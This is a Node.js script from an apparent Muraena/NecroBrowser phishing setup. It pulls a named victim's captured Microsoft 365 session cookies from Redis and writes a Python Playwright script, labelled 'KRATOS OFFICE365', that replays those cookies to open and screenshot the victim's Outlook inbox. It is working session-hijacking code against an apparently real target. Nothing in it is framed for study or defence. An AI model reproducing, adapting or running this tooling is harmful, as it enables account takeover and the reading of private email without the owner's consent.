// Generate the Playwright .py cookie script from Redis and write to /tmp/out.py
// Run from /app inside muraena-necrobrowser-1: node /app/gen_py.js
const { createClient } = require('redis')
const fs = require('fs')

const uuid = "B64A0a6a-0fB1-47eC-a2DA-2f4901dF1a3d"
const rc = createClient({ url: process.env.REDIS_URL || 'redis://redis:6379' })

rc.connect().then(async () => {
    const cookieNames = await rc.lRange(`victim:${uuid}:cookiejar_entries`, 0, -1)
    const cookies = []
    for (const name of cookieNames) {
        const h = await rc.hGetAll(`victim:${uuid}:cookiejar:${name}`)
        if (h && h.value) {
            cookies.push({
                Name: h.name || name,
                Value: h.value,
                Domain: h.domain || '.login.microsoftonline.com',
                Path: h.path || '/',
                Secure: (h.secure === '1'),
                HttpOnly: (h.httpOnly === '1'),
                SameSite: h.sameSite || 'None',
                Expires: parseInt(h.expires) || 0
            })
        }
    }
    await rc.quit()

    const b64 = Buffer.from(JSON.stringify(cookies)).toString('base64')
    const label = 'josfer_fernando_tvzimbo_com'

    const script = [
        '#!/usr/bin/env python3',
        '# KRATOS OFFICE365',
        '# pip install playwright && playwright install chromium',
        '# python3 ' + label + '.py',
        'import asyncio, json, base64',
        'from playwright.async_api import async_playwright',
        '',
        'COOKIES_B64 = "' + b64 + '"',
        '',
        'async def main():',
        '    async with async_playwright() as p:',
        '        browser = await p.chromium.launch(headless=False)',
        '        context = await browser.new_context()',
        '        raw = json.loads(base64.b64decode(COOKIES_B64))',
        '        cookies = []',
        '        for c in raw:',
        '            ck = {',
        '                "name": c["Name"], "value": c["Value"],',
        '                "domain": c["Domain"], "path": c.get("Path", "/"),',
        '                "secure": c.get("Secure", False),',
        '                "http_only": c.get("HttpOnly", False),',
        '                "same_site": c.get("SameSite", "None"),',
        '            }',
        '            if c.get("Expires", 0) > 0:',
        '                ck["expires"] = float(c["Expires"])',
        '            cookies.append(ck)',
        '        await context.add_cookies(cookies)',
        '        page = await context.new_page()',
        '        await page.goto("https://outlook.office.com/mail/", wait_until="domcontentloaded")',
        '        await page.wait_for_timeout(5000)',
        '        await page.screenshot(path="inbox.png")',
        '        print("URL:", page.url)',
        '        input("Press Enter to close...")',
        '        await browser.close()',
        '',
        'asyncio.run(main())'
    ].join('\n')

    fs.writeFileSync('/tmp/josfer_fernando_tvzimbo_com.py', script)
    console.log('Cookies: ' + cookies.length)
    console.log('Script length: ' + script.length)
}).catch(e => { console.error(e.message); process.exit(1) })
